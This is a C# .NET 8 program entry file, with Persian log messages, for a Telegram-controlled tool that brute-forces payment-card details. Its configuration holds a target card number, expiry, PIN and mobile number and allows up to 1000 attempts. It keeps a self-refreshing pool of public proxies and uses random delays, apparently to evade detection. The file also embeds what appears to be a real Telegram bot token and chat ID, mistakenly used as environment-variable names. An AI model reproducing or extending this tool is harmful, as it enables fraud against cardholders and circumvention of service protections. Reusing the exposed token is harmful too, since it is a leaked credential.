// language: C#, file: Program.cs, runtime: .NET 8
using Iva.Auth;
using Iva.Bot;

var botToken = Environment.GetEnvironmentVariable("8905922089:AAE7SlbFpKGFiRcEOFuBu2DChV_jbsnRuv8");
if (string.IsNullOrWhiteSpace(botToken))
{
    Console.Error.WriteLine("[FATAL] IVA_BOT_TOKEN not set.");
    return 1;
}

if (!long.TryParse(Environment.GetEnvironmentVariable("8505419724"), out var allowedChatId))
{
    Console.Error.WriteLine("[FATAL] IVA_ALLOWED_CHAT_ID not set or invalid.");
    return 1;
}

var sessionsDir = Environment.GetEnvironmentVariable("IVA_SESSIONS_DIR")
    ?? Path.Combine(AppContext.BaseDirectory, "sessions");

Directory.CreateDirectory(sessionsDir);

var cfg = new BruteConfig
{
    SessionsDir = sessionsDir,
    TargetPan = Environment.GetEnvironmentVariable("TARGET_PAN") ?? "",
    ExpireMonth = Environment.GetEnvironmentVariable("TARGET_EXP_MONTH") ?? "",
    ExpireYear = Environment.GetEnvironmentVariable("TARGET_EXP_YEAR") ?? "",
    Pin = Environment.GetEnvironmentVariable("TARGET_PIN") ?? "",
    TargetMobileNo = Environment.GetEnvironmentVariable("TARGET_MOBILE") ?? "09120000000",
    ProviderId = Environment.GetEnvironmentVariable("PROVIDER_ID") ?? "1",
    MaxTotalAttempts = int.Parse(Environment.GetEnvironmentVariable("MAX_ATTEMPTS") ?? "1000"),
    MaxConsecutiveErrors = int.Parse(Environment.GetEnvironmentVariable("MAX_ERRORS") ?? "3"),
    DelayMinMs = int.Parse(Environment.GetEnvironmentVariable("DELAY_MIN") ?? "2000"),
    DelayMaxMs = int.Parse(Environment.GetEnvironmentVariable("DELAY_MAX") ?? "5000"),
    LogPath = Path.Combine(sessionsDir, "..", "brute.log"),
};

var repo = new FileSessionRepository(sessionsDir);
var ivaOptions = new IvaOptions { Timeout = TimeSpan.FromSeconds(65), MaxChargeRetries = 10 };
var manager = new IvaSessionManager(ivaOptions, repo);

var pool = new ProxyPool();
pool.LoadFromFile(Path.Combine(sessionsDir, "proxies.txt"));
Console.WriteLine($"[BOOT] {pool.Count} proxy از فایل");

var fetcher = new ProxyFetcher();
var validator = new ProxyValidator(150, 8000);

Console.WriteLine("[BOOT] fetch اولیه proxy...");
var initial = await fetcher.FetchAllAsync();
var valid = await validator.ValidateAllAsync(initial);
pool.AddOrUpdate(valid);
pool.SaveToFile(Path.Combine(sessionsDir, "proxies.txt"));
Console.WriteLine($"[BOOT] {pool.Count} proxy زنده");

using var cts = new CancellationTokenSource();
Console.CancelKeyPress += (_, e) => { e.Cancel = true; cts.Cancel(); };

_ = Task.Run(() => new ProxyRefresher(
    fetcher, validator, TimeSpan.FromMinutes(10),
    onRefresh: list =>
    {
        pool.AddOrUpdate(list);
        pool.SaveToFile(Path.Combine(sessionsDir, "proxies.txt"));
        Console.WriteLine($"[REFRESH] +{list.Count} proxy | pool={pool.Count}");
    }).RunAsync(cts.Token));

var bot = new IvaTelegramBot(botToken, allowedChatId, manager, pool, cfg);
Console.WriteLine("[BOOT] bot started");

await bot.RunAsync(cts.Token);
return 0;